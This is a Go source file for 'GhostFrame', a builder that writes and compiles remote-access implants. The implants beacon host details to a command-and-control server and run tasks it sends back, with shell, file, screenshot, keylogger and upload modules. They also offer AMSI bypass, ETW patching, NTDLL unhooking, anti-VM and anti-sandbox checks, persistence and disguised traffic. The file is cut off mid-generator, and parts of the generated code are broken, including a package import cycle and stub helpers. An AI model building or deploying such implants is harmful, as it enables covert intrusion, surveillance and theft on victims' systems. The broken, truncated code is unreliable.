// ╔══════════════════════════════════════════════════════════════════════════════╗
// ║                         GHOSTFRAME UNIFIED BUILDER                           ║
// ║                    Single-File Implant Generation System                     ║
// ║                                                                              ║
// ║  Usage: go run builder.go [flags]                                            ║
// ║  Example: go run builder.go -c2 "https://c2.example.com" -os windows         ║
// ╚══════════════════════════════════════════════════════════════════════════════╝

package main

import (
	"bufio"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"text/template"
	"time"
)

// ═══════════════════════════════════════════════════════════════════════════════
// CONFIGURATION STRUCTURES
// ═══════════════════════════════════════════════════════════════════════════════

type BuildConfig struct {
	// Target
	TargetOS       string
	TargetArch     string
	OutputName     string
	OutputFormat   string // exe, dll, shellcode

	// C2
	C2Protocol     string
	C2Host         string
	C2Port         int
	C2Endpoint     string
	C2Fallback     []C2Endpoint
	Sleep          string
	Jitter         int
	MaxRetries     int
	KillDate       string

	// Crypto
	EncryptionKey  string

	// Evasion
	AntiDebug      bool
	AntiVM         bool
	AntiSandbox    bool
	UnhookNtdll    bool
	DirectSyscalls bool
	AMSIBypass     bool
	ETWPatch       bool
	ObfuscateStrings bool

	// Persistence
	PersistenceEnabled bool
	PersistenceMethod  string // registry, scheduled_task, wmi, startup

	// Modules
	ModuleShell       bool
	ModuleFileManager bool
	ModuleScreenshot  bool
	ModuleKeylogger   bool
	ModuleProcessList bool
	ModuleNetworkRecon bool
	ModuleDownload    bool
	ModuleUpload      bool

	// Build
	StripSymbols   bool
	HideConsole    bool
	UseGarble      bool

	// Generated
	BuildID        string
	BuildTimestamp string
	AgentID        string
}

type C2Endpoint struct {
	Protocol string
	Host     string
	Port     int
	Endpoint string
}

// ═══════════════════════════════════════════════════════════════════════════════
// MAIN ENTRY POINT
// ═══════════════════════════════════════════════════════════════════════════════

func main() {
	printBanner()

	config := &BuildConfig{}
	interactive := flag.Bool("interactive", false, "Run in interactive mode")

	// Target flags
	flag.StringVar(&config.TargetOS, "os", "windows", "Target OS (windows/linux/darwin)")
	flag.StringVar(&config.TargetArch, "arch", "amd64", "Target architecture (amd64/386/arm64)")
	flag.StringVar(&config.OutputName, "out", "", "Output filename (auto-generated if empty)")
	flag.StringVar(&config.OutputFormat, "format", "exe", "Output format (exe/dll/shellcode)")

	// C2 flags
	flag.StringVar(&config.C2Protocol, "protocol", "https", "C2 protocol (http/https/dns)")
	flag.StringVar(&config.C2Host, "c2", "", "C2 server hostname/IP (required)")
	flag.IntVar(&config.C2Port, "port", 443, "C2 server port")
	flag.StringVar(&config.C2Endpoint, "endpoint", "/api/v1/beacon", "C2 endpoint path")
	flag.StringVar(&config.Sleep, "sleep", "30s", "Beacon sleep interval")
	flag.IntVar(&config.Jitter, "jitter", 25, "Sleep jitter percentage (0-50)")
	flag.IntVar(&config.MaxRetries, "retries", 5, "Max retries before fallback")
	flag.StringVar(&config.KillDate, "killdate", "", "Kill date (YYYY-MM-DD, empty=none)")

	// Crypto flags
	flag.StringVar(&config.EncryptionKey, "key", "", "Encryption key (auto-generated if empty)")

	// Evasion flags
	flag.BoolVar(&config.AntiDebug, "antidebug", true, "Enable anti-debugging")
	flag.BoolVar(&config.AntiVM, "antivm", true, "Enable anti-VM detection")
	flag.BoolVar(&config.AntiSandbox, "antisandbox", true, "Enable anti-sandbox")
	flag.BoolVar(&config.UnhookNtdll, "unhook", true, "Unhook NTDLL (Windows)")
	flag.BoolVar(&config.DirectSyscalls, "syscalls", false, "Use direct syscalls")
	flag.BoolVar(&config.AMSIBypass, "amsi", true, "Bypass AMSI (Windows)")
	flag.BoolVar(&config.ETWPatch, "etw", true, "Patch ETW (Windows)")
	flag.BoolVar(&config.ObfuscateStrings, "obfuscate", true, "Obfuscate strings")

	// Persistence flags
	flag.BoolVar(&config.PersistenceEnabled, "persist", false, "Enable persistence")
	flag.StringVar(&config.PersistenceMethod, "persist-method", "registry", "Persistence method")

	// Module flags
	flag.BoolVar(&config.ModuleShell, "mod-shell", true, "Include shell module")
	flag.BoolVar(&config.ModuleFileManager, "mod-file", true, "Include file manager module")
	flag.BoolVar(&config.ModuleScreenshot, "mod-screenshot", true, "Include screenshot module")
	flag.BoolVar(&config.ModuleKeylogger, "mod-keylog", false, "Include keylogger module")
	flag.BoolVar(&config.ModuleProcessList, "mod-proc", true, "Include process list module")
	flag.BoolVar(&config.ModuleNetworkRecon, "mod-net", true, "Include network recon module")
	flag.BoolVar(&config.ModuleDownload, "mod-download", true, "Include download module")
	flag.BoolVar(&config.ModuleUpload, "mod-upload", true, "Include upload module")

	// Build flags
	flag.BoolVar(&config.StripSymbols, "strip", true, "Strip debug symbols")
	flag.BoolVar(&config.HideConsole, "noconsole", true, "Hide console window (Windows)")
	flag.BoolVar(&config.UseGarble, "garble", false, "Use garble for obfuscation")

	flag.Parse()

	// Interactive mode
	if *interactive {
		runInteractiveMode(config)
	}

	// Validate required fields
	if config.C2Host == "" {
		fatal("C2 host is required. Use -c2 flag or -interactive mode.")
	}

	// Generate build metadata
	config.BuildID = generateBuildID()
	config.BuildTimestamp = time.Now().UTC().Format(time.RFC3339)
	config.AgentID = generateAgentID()

	// Generate encryption key if not provided
	if config.EncryptionKey == "" {
		config.EncryptionKey = generateKey(32)
	}

	// Auto-generate output name
	if config.OutputName == "" {
		config.OutputName = generateOutputName(config)
	}

	// Display configuration
	printConfig(config)

	// Build the agent
	outputPath, err := buildAgent(config)
	if err != nil {
		fatal("Build failed: %v", err)
	}

	// Print summary
	printSummary(config, outputPath)
}

// ═══════════════════════════════════════════════════════════════════════════════
// INTERACTIVE MODE
// ═══════════════════════════════════════════════════════════════════════════════

func runInteractiveMode(config *BuildConfig) {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println("\n[*] Interactive Configuration Mode")
	fmt.Println(strings.Repeat("─", 50))

	// C2 Configuration
	fmt.Println("\n── C2 CONFIGURATION ──")
	config.C2Host = prompt(reader, "C2 Host", "")
	config.C2Port = promptInt(reader, "C2 Port", 443)
	config.C2Protocol = prompt(reader, "Protocol (http/https)", "https")
	config.C2Endpoint = prompt(reader, "Endpoint Path", "/api/v1/beacon")
	config.Sleep = prompt(reader, "Sleep Interval", "30s")
	config.Jitter = promptInt(reader, "Jitter %", 25)
	config.KillDate = prompt(reader, "Kill Date (YYYY-MM-DD, empty=none)", "")

	// Target Configuration
	fmt.Println("\n── TARGET CONFIGURATION ──")
	config.TargetOS = prompt(reader, "Target OS (windows/linux/darwin)", "windows")
	config.TargetArch = prompt(reader, "Target Arch (amd64/386/arm64)", "amd64")
	config.OutputName = prompt(reader, "Output Filename", "")

	// Evasion Configuration
	fmt.Println("\n── EVASION CONFIGURATION ──")
	config.AntiDebug = promptBool(reader, "Enable Anti-Debug", true)
	config.AntiVM = promptBool(reader, "Enable Anti-VM", true)
	config.AntiSandbox = promptBool(reader, "Enable Anti-Sandbox", true)
	
	if config.TargetOS == "windows" {
		config.UnhookNtdll = promptBool(reader, "Unhook NTDLL", true)
		config.AMSIBypass = promptBool(reader, "Bypass AMSI", true)
		config.ETWPatch = promptBool(reader, "Patch ETW", true)
	}

	config.ObfuscateStrings = promptBool(reader, "Obfuscate Strings", true)

	// Persistence Configuration
	fmt.Println("\n── PERSISTENCE CONFIGURATION ──")
	config.PersistenceEnabled = promptBool(reader, "Enable Persistence", false)
	if config.PersistenceEnabled {
		config.PersistenceMethod = prompt(reader, "Method (registry/scheduled_task/startup)", "registry")
	}

	// Module Configuration
	fmt.Println("\n── MODULE CONFIGURATION ──")
	config.ModuleShell = promptBool(reader, "Shell Module", true)
	config.ModuleFileManager = promptBool(reader, "File Manager Module", true)
	config.ModuleScreenshot = promptBool(reader, "Screenshot Module", true)
	config.ModuleKeylogger = promptBool(reader, "Keylogger Module", false)
	config.ModuleProcessList = promptBool(reader, "Process List Module", true)
	config.ModuleNetworkRecon = promptBool(reader, "Network Recon Module", true)
	config.ModuleDownload = promptBool(reader, "Download Module", true)
	config.ModuleUpload = promptBool(reader, "Upload Module", true)

	fmt.Println("\n" + strings.Repeat("─", 50))
}

func prompt(reader *bufio.Reader, label, defaultVal string) string {
	if defaultVal != "" {
		fmt.Printf("  %s [%s]: ", label, defaultVal)
	} else {
		fmt.Printf("  %s: ", label)
	}
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	if input == "" {
		return defaultVal
	}
	return input
}

func promptInt(reader *bufio.Reader, label string, defaultVal int) int {
	fmt.Printf("  %s [%d]: ", label, defaultVal)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	if input == "" {
		return defaultVal
	}
	val, err := strconv.Atoi(input)
	if err != nil {
		return defaultVal
	}
	return val
}

func promptBool(reader *bufio.Reader, label string, defaultVal bool) bool {
	defStr := "n"
	if defaultVal {
		defStr = "y"
	}
	fmt.Printf("  %s [%s]: ", label, defStr)
	input, _ := reader.ReadString('\n')
	input = strings.ToLower(strings.TrimSpace(input))
	if input == "" {
		return defaultVal
	}
	return input == "y" || input == "yes" || input == "true" || input == "1"
}

// ═══════════════════════════════════════════════════════════════════════════════
// BUILD PROCESS
// ═══════════════════════════════════════════════════════════════════════════════

func buildAgent(config *BuildConfig) (string, error) {
	// Create temp directory for build
	buildDir, err := ioutil.TempDir("", "ghostframe-build-")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %v", err)
	}
	defer os.RemoveAll(buildDir)

	info("Build directory: %s", buildDir)

	// Create directory structure
	dirs := []string{
		"cmd",
		"internal/config",
		"internal/core",
		"internal/c2",
		"internal/crypto",
		"internal/evasion",
		"internal/modules",
		"internal/persistence",
		"internal/util",
	}

	for _, dir := range dirs {
		os.MkdirAll(filepath.Join(buildDir, dir), 0755)
	}

	// Generate all source files
	info("Generating source files...")

	files := map[string]string{
		"go.mod":                     generateGoMod(config),
		"cmd/main.go":                generateMainGo(config),
		"internal/config/config.go":  generateConfigGo(config),
		"internal/core/agent.go":     generateAgentGo(config),
		"internal/core/tasker.go":    generateTaskerGo(config),
		"internal/c2/transport.go":   generateTransportGo(config),
		"internal/c2/http.go":        generateHTTPGo(config),
		"internal/crypto/aes.go":     generateCryptoGo(config),
		"internal/util/helpers.go":   generateHelpersGo(config),
	}

	// Add platform-specific evasion
	if config.TargetOS == "windows" {
		files["internal/evasion/evasion_windows.go"] = generateEvasionWindowsGo(config)
		files["internal/evasion/syscalls_windows.go"] = generateSyscallsWindowsGo(config)
	} else {
		files["internal/evasion/evasion_unix.go"] = generateEvasionUnixGo(config)
	}

	// Add enabled modules
	if config.ModuleShell {
		files["internal/modules/shell.go"] = generateShellModuleGo(config)
	}
	if config.ModuleFileManager {
		files["internal/modules/file.go"] = generateFileModuleGo(config)
	}
	if config.ModuleScreenshot {
		files["internal/modules/screenshot.go"] = generateScreenshotModuleGo(config)
	}
	if config.ModuleKeylogger && config.TargetOS == "windows" {
		files["internal/modules/keylogger.go"] = generateKeyloggerModuleGo(config)
	}
	if config.ModuleProcessList {
		files["internal/modules/process.go"] = generateProcessModuleGo(config)
	}
	if config.ModuleNetworkRecon {
		files["internal/modules/network.go"] = generateNetworkModuleGo(config)
	}
	if config.ModuleDownload {
		files["internal/modules/download.go"] = generateDownloadModuleGo(config)
	}
	if config.ModuleUpload {
		files["internal/modules/upload.go"] = generateUploadModuleGo(config)
	}

	// Add persistence if enabled
	if config.PersistenceEnabled {
		if config.TargetOS == "windows" {
			files["internal/persistence/persist_windows.go"] = generatePersistWindowsGo(config)
		} else {
			files["internal/persistence/persist_unix.go"] = generatePersistUnixGo(config)
		}
	}

	// Write all files
	for path, content := range files {
		fullPath := filepath.Join(buildDir, path)
		if err := ioutil.WriteFile(fullPath, []byte(content), 0644); err != nil {
			return "", fmt.Errorf("failed to write %s: %v", path, err)
		}
	}

	info("Generated %d source files", len(files))

	// Compile
	info("Compiling agent...")

	outputPath := filepath.Join(".", config.OutputName)

	// Build ldflags
	ldflags := ""
	if config.StripSymbols {
		ldflags = "-s -w"
	}
	if config.HideConsole && config.TargetOS == "windows" {
		ldflags += " -H windowsgui"
	}

	// Determine compiler
	compiler := "go"
	if config.UseGarble {
		compiler = "garble"
	}

	args := []string{"build", "-trimpath"}
	if ldflags != "" {
		args = append(args, "-ldflags", ldflags)
	}
	args = append(args, "-o", outputPath, "./cmd")

	cmd := exec.Command(compiler, args...)
	cmd.Dir = buildDir
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("GOOS=%s", config.TargetOS),
		fmt.Sprintf("GOARCH=%s", config.TargetArch),
		"CGO_ENABLED=0",
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("compilation failed: %v\n%s", err, string(output))
	}

	// Move binary to current directory
	finalPath := filepath.Join(".", config.OutputName)
	if buildDir != "." {
		srcPath := filepath.Join(buildDir, config.OutputName)
		if err := copyFile(srcPath, finalPath); err != nil {
			// Try alternative: binary might be in buildDir directly
			srcPath = outputPath
			if err := copyFile(srcPath, finalPath); err != nil {
				return outputPath, nil
			}
		}
	}

	return finalPath, nil
}

// ═══════════════════════════════════════════════════════════════════════════════
// SOURCE CODE GENERATORS
// ═══════════════════════════════════════════════════════════════════════════════

func generateGoMod(config *BuildConfig) string {
	return `module ghostframe

go 1.21

require golang.org/x/sys v0.15.0
`
}

func generateMainGo(config *BuildConfig) string {
	return fmt.Sprintf(`// Build ID: %s
// Generated: %s

package main

import (
	"ghostframe/internal/config"
	"ghostframe/internal/core"
	"ghostframe/internal/evasion"
	"os"
	"time"
)

func main() {
	// ═══ PHASE 1: Environment Checks ═══
	%s

	// ═══ PHASE 2: Evasion Techniques ═══
	%s

	// ═══ PHASE 3: Initialize Agent ═══
	cfg := config.GetConfig()
	agent := core.NewAgent(cfg)

	// ═══ PHASE 4: Run Agent ═══
	agent.Run()
}
`,
		config.BuildID,
		config.BuildTimestamp,
		generatePreflightChecks(config),
		generateEvasionCalls(config),
	)
}

func generatePreflightChecks(config *BuildConfig) string {
	var checks []string

	if config.KillDate != "" {
		checks = append(checks, fmt.Sprintf(`
	// Kill date check
	killDate, _ := time.Parse("2006-01-02", "%s")
	if time.Now().After(killDate) {
		os.Exit(0)
	}`, config.KillDate))
	}

	if config.AntiDebug {
		checks = append(checks, `
	// Anti-debug check
	if evasion.IsDebuggerPresent() {
		time.Sleep(time.Duration(30) * time.Second)
		os.Exit(0)
	}`)
	}

	if config.AntiVM {
		checks = append(checks, `
	// Anti-VM check
	if evasion.IsVirtualMachine() {
		time.Sleep(time.Duration(60) * time.Second)
		if evasion.IsVirtualMachine() {
			os.Exit(0)
		}
	}`)
	}

	if config.AntiSandbox {
		checks = append(checks, `
	// Anti-sandbox check
	if evasion.IsSandbox() {
		os.Exit(0)
	}`)
	}

	if len(checks) == 0 {
		return "// No preflight checks enabled"
	}

	return strings.Join(checks, "\n")
}

func generateEvasionCalls(config *BuildConfig) string {
	var calls []string

	if config.TargetOS == "windows" {
		if config.UnhookNtdll {
			calls = append(calls, `evasion.UnhookNtdll()`)
		}
		if config.AMSIBypass {
			calls = append(calls, `evasion.PatchAMSI()`)
		}
		if config.ETWPatch {
			calls = append(calls, `evasion.PatchETW()`)
		}
	}

	if len(calls) == 0 {
		return "// No evasion techniques enabled"
	}

	return strings.Join(calls, "\n\t")
}

func generateConfigGo(config *BuildConfig) string {
	// Obfuscate sensitive strings
	c2Host := config.C2Host
	c2Endpoint := config.C2Endpoint
	encKey := config.EncryptionKey

	if config.ObfuscateStrings {
		c2Host = obfuscateString(config.C2Host, config.EncryptionKey[:16])
		c2Endpoint = obfuscateString(config.C2Endpoint, config.EncryptionKey[:16])
	}

	return fmt.Sprintf(`package config

import (
	"encoding/base64"
	"time"
)

type AgentConfig struct {
	AgentID       string
	C2Endpoints   []Endpoint
	Sleep         time.Duration
	Jitter        int
	MaxRetries    int
	EncryptionKey []byte
	
	// Modules
	EnableShell      bool
	EnableFileOps    bool
	EnableScreenshot bool
	EnableKeylogger  bool
	EnableProcList   bool
	EnableNetRecon   bool
	EnableDownload   bool
	EnableUpload     bool
	
	// Persistence
	PersistenceEnabled bool
	PersistenceMethod  string
}

type Endpoint struct {
	Protocol string
	Host     string
	Port     int
	Path     string
}

var deobfuscateKey = []byte("%s")

func GetConfig() *AgentConfig {
	return &AgentConfig{
		AgentID: "%s",
		C2Endpoints: []Endpoint{
			{
				Protocol: "%s",
				Host:     deobfuscate("%s"),
				Port:     %d,
				Path:     deobfuscate("%s"),
			},
		},
		Sleep:         parseDuration("%s"),
		Jitter:        %d,
		MaxRetries:    %d,
		EncryptionKey: []byte("%s"),
		
		EnableShell:      %t,
		EnableFileOps:    %t,
		EnableScreenshot: %t,
		EnableKeylogger:  %t,
		EnableProcList:   %t,
		EnableNetRecon:   %t,
		EnableDownload:   %t,
		EnableUpload:     %t,
		
		PersistenceEnabled: %t,
		PersistenceMethod:  "%s",
	}
}

func deobfuscate(encoded string) string {
	if encoded == "" {
		return ""
	}
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return encoded
	}
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ deobfuscateKey[i%%len(deobfuscateKey)]
	}
	return string(result)
}

func parseDuration(s string) time.Duration {
	d, err := time.ParseDuration(s)
	if err != nil {
		return 30 * time.Second
	}
	return d
}
`,
		config.EncryptionKey[:16],
		config.AgentID,
		config.C2Protocol,
		c2Host,
		config.C2Port,
		c2Endpoint,
		config.Sleep,
		config.Jitter,
		config.MaxRetries,
		encKey,
		config.ModuleShell,
		config.ModuleFileManager,
		config.ModuleScreenshot,
		config.ModuleKeylogger,
		config.ModuleProcessList,
		config.ModuleNetworkRecon,
		config.ModuleDownload,
		config.ModuleUpload,
		config.PersistenceEnabled,
		config.PersistenceMethod,
	)
}

func generateAgentGo(config *BuildConfig) string {
	return `package core

import (
	"context"
	"encoding/json"
	"math/rand"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"ghostframe/internal/c2"
	"ghostframe/internal/config"
	"ghostframe/internal/modules"
)

type Agent struct {
	Config       *config.AgentConfig
	Transport    *c2.HTTPTransport
	TaskQueue    chan Task
	ResultQueue  chan TaskResult
	Modules      map[string]modules.Module
	
	ctx          context.Context
	cancel       context.CancelFunc
	wg           sync.WaitGroup
}

type Task struct {
	ID      string                 ` + "`json:\"id\"`" + `
	Type    string                 ` + "`json:\"type\"`" + `
	Module  string                 ` + "`json:\"module\"`" + `
	Command string                 ` + "`json:\"command\"`" + `
	Args    map[string]interface{} ` + "`json:\"args\"`" + `
	Timeout int                    ` + "`json:\"timeout\"`" + `
}

type TaskResult struct {
	TaskID    string      ` + "`json:\"task_id\"`" + `
	AgentID   string      ` + "`json:\"agent_id\"`" + `
	Status    string      ` + "`json:\"status\"`" + `
	Output    interface{} ` + "`json:\"output\"`" + `
	Error     string      ` + "`json:\"error,omitempty\"`" + `
	Timestamp time.Time   ` + "`json:\"timestamp\"`" + `
}

func NewAgent(cfg *config.AgentConfig) *Agent {
	ctx, cancel := context.WithCancel(context.Background())
	
	agent := &Agent{
		Config:      cfg,
		TaskQueue:   make(chan Task, 100),
		ResultQueue: make(chan TaskResult, 100),
		Modules:     make(map[string]modules.Module),
		ctx:         ctx,
		cancel:      cancel,
	}

	// Initialize transport
	agent.Transport = c2.NewHTTPTransport(cfg)

	// Register modules
	agent.registerModules()

	return agent
}

func (a *Agent) registerModules() {
	if a.Config.EnableShell {
		a.Modules["shell"] = modules.NewShellModule()
	}
	if a.Config.EnableFileOps {
		a.Modules["file"] = modules.NewFileModule()
	}
	if a.Config.EnableScreenshot {
		a.Modules["screenshot"] = modules.NewScreenshotModule()
	}
	if a.Config.EnableProcList {
		a.Modules["process"] = modules.NewProcessModule()
	}
	if a.Config.EnableNetRecon {
		a.Modules["network"] = modules.NewNetworkModule()
	}
	if a.Config.EnableDownload {
		a.Modules["download"] = modules.NewDownloadModule()
	}
	if a.Config.EnableUpload {
		a.Modules["upload"] = modules.NewUploadModule()
	}
}

func (a *Agent) Run() {
	// Start workers
	a.wg.Add(3)
	go a.beaconLoop()
	go a.taskProcessor()
	go a.resultSender()

	// Handle signals
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	select {
	case <-sigChan:
		a.Shutdown()
	case <-a.ctx.Done():
		return
	}
}

func (a *Agent) beaconLoop() {
	defer a.wg.Done()

	for {
		select {
		case <-a.ctx.Done():
			return
		default:
			// Calculate jittered sleep
			jitterMs := rand.Intn(int(a.Config.Sleep.Milliseconds()) * a.Config.Jitter / 100)
			actualSleep := a.Config.Sleep + time.Duration(jitterMs)*time.Millisecond

			// Checkin
			tasks, err := a.Transport.Checkin(a.buildCheckinData())
			if err == nil {
				for _, task := range tasks {
					a.TaskQueue <- task
				}
			}

			time.Sleep(actualSleep)
		}
	}
}

func (a *Agent) buildCheckinData() c2.CheckinData {
	hostname, _ := os.Hostname()
	return c2.CheckinData{
		AgentID:     a.Config.AgentID,
		Hostname:    hostname,
		OS:          getOS(),
		Arch:        getArch(),
		PID:         os.Getpid(),
		ProcessName: getProcessName(),
		InternalIP:  getInternalIP(),
		Modules:     a.getModuleList(),
	}
}

func (a *Agent) taskProcessor() {
	defer a.wg.Done()

	for {
		select {
		case <-a.ctx.Done():
			return
		case task := <-a.TaskQueue:
			result := a.executeTask(task)
			a.ResultQueue <- result
		}
	}
}

func (a *Agent) executeTask(task Task) TaskResult {
	result := TaskResult{
		TaskID:    task.ID,
		AgentID:   a.Config.AgentID,
		Timestamp: time.Now(),
	}

	timeout := time.Duration(task.Timeout) * time.Second
	if timeout == 0 {
		timeout = 60 * time.Second
	}

	ctx, cancel := context.WithTimeout(a.ctx, timeout)
	defer cancel()

	module, exists := a.Modules[task.Module]
	if !exists {
		result.Status = "error"
		result.Error = "module not found: " + task.Module
		return result
	}

	output, err := module.Execute(ctx, task.Command, task.Args)
	if err != nil {
		result.Status = "error"
		result.Error = err.Error()
	} else {
		result.Status = "success"
		result.Output = output
	}

	return result
}

func (a *Agent) resultSender() {
	defer a.wg.Done()

	buffer := make([]TaskResult, 0, 10)
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-a.ctx.Done():
			if len(buffer) > 0 {
				a.Transport.SendResults(buffer)
			}
			return
		case result := <-a.ResultQueue:
			buffer = append(buffer, result)
			if len(buffer) >= 10 {
				a.Transport.SendResults(buffer)
				buffer = buffer[:0]
			}
		case <-ticker.C:
			if len(buffer) > 0 {
				a.Transport.SendResults(buffer)
				buffer = buffer[:0]
			}
		}
	}
}

func (a *Agent) getModuleList() []string {
	list := make([]string, 0, len(a.Modules))
	for name := range a.Modules {
		list = append(list, name)
	}
	return list
}

func (a *Agent) Shutdown() {
	a.cancel()
	a.wg.Wait()
}

// Helper functions
func getOS() string { return "" }
func getArch() string { return "" }
func getProcessName() string { return "" }
func getInternalIP() string { return "" }
`
}

func generateTaskerGo(config *BuildConfig) string {
	return `package core

// Task routing and management
`
}

func generateTransportGo(config *BuildConfig) string {
	return `package c2

import "ghostframe/internal/core"

type CheckinData struct {
	AgentID     string   ` + "`json:\"agent_id\"`" + `
	Hostname    string   ` + "`json:\"hostname\"`" + `
	Username    string   ` + "`json:\"username\"`" + `
	OS          string   ` + "`json:\"os\"`" + `
	Arch        string   ` + "`json:\"arch\"`" + `
	PID         int      ` + "`json:\"pid\"`" + `
	ProcessName string   ` + "`json:\"process_name\"`" + `
	InternalIP  string   ` + "`json:\"internal_ip\"`" + `
	ExternalIP  string   ` + "`json:\"external_ip\"`" + `
	Integrity   string   ` + "`json:\"integrity\"`" + `
	Modules     []string ` + "`json:\"modules\"`" + `
}

type Transport interface {
	Checkin(data CheckinData) ([]core.Task, error)
	SendResults(results []core.TaskResult) error
}
`
}

func generateHTTPGo(config *BuildConfig) string {
	return fmt.Sprintf(`package c2

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"sync"
	"time"

	"ghostframe/internal/config"
	"ghostframe/internal/core"
	"ghostframe/internal/crypto"
)

type HTTPTransport struct {
	Config       *config.AgentConfig
	Client       *http.Client
	CurrentIndex int
	mu           sync.RWMutex
	userAgents   []string
}

func NewHTTPTransport(cfg *config.AgentConfig) *HTTPTransport {
	return &HTTPTransport{
		Config:       cfg,
		CurrentIndex: 0,
		Client: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					MinVersion:         tls.VersionTLS12,
				},
				DisableKeepAlives: true,
			},
		},
		userAgents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
		},
	}
}

func (t *HTTPTransport) currentEndpoint() config.Endpoint {
	t.mu.RLock()
	defer t.mu.RUnlock()
	if len(t.Config.C2Endpoints) == 0 {
		return config.Endpoint{}
	}
	return t.Config.C2Endpoints[t.CurrentIndex%%len(t.Config.C2Endpoints)]
}

func (t *HTTPTransport) buildURL(path string) string {
	ep := t.currentEndpoint()
	return fmt.Sprintf("%%s://%%s:%%d%%s", ep.Protocol, ep.Host, ep.Port, path)
}

func (t *HTTPTransport) Checkin(data CheckinData) ([]core.Task, error) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}

	encrypted, err := crypto.Encrypt(jsonData, t.Config.EncryptionKey)
	if err != nil {
		return nil, err
	}

	ep := t.currentEndpoint()
	req, err := http.NewRequest("POST", t.buildURL(ep.Path), bytes.NewReader(encrypted))
	if err != nil {
		return nil, err
	}

	// Set headers for traffic blending
	req.Header.Set("User-Agent", t.userAgents[time.Now().UnixNano()%%int64(len(t.userAgents))])
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")

	resp, err := t.Client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status %%d", resp.StatusCode)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	decrypted, err := crypto.Decrypt(body, t.Config.EncryptionKey)
	if err != nil {
		return nil, err
	}

	var tasks []core.Task
	if err := json.Unmarshal(decrypted, &tasks); err != nil {
		return nil, err
	}

	return tasks, nil
}

func (t *HTTPTransport) SendResults(results []core.TaskResult) error {
	jsonData, err := json.Marshal(results)
	if err != nil {
		return err
	}

	encrypted, err := crypto.Encrypt(jsonData, t.Config.EncryptionKey)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", t.buildURL("/api/v1/results"), bytes.NewReader(encrypted))
	if err != nil {
		return err
	}

	req.Header.Set("User-Agent", t.userAgents[time.Now().UnixNano()%%int64(len(t.userAgents))])
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := t.Client.Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()

	return nil
}
`)
}

func generateCryptoGo(config *BuildConfig) string {
	return `package crypto

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
)

func Encrypt(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key[:32])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return []byte(base64.StdEncoding.EncodeToString(ciphertext)), nil
}

func Decrypt(ciphertext, key []byte) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(string(ciphertext))
	if err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(key[:32])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertextBytes := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertextBytes, nil)
}
`
}

func generateHelpersGo(config *BuildConfig) string {
	return `package util

import (
	"crypto/rand"
	"encoding/hex"
	"net"
	"os"
	"path/filepath"
	"runtime"
)

func GetHostname() string {
	hostname, _ := os.Hostname()
	return hostname
}

func GetUsername() string {
	return os.Getenv("USER")
}

func GetOS() string {
	return runtime.GOOS
}

func GetArch() string {
	return runtime.GOARCH
}

func GetProcessName() string {
	path, _ := os.Executable()
	return filepath.Base(path)
}

func GetInternalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

func RandomString(n int) string {
	bytes := make([]byte, n/2)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}
`
}

func generateEvasionWindowsGo(config *BuildConfig) string {
	return `//go:build windows

package evasion

import (
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
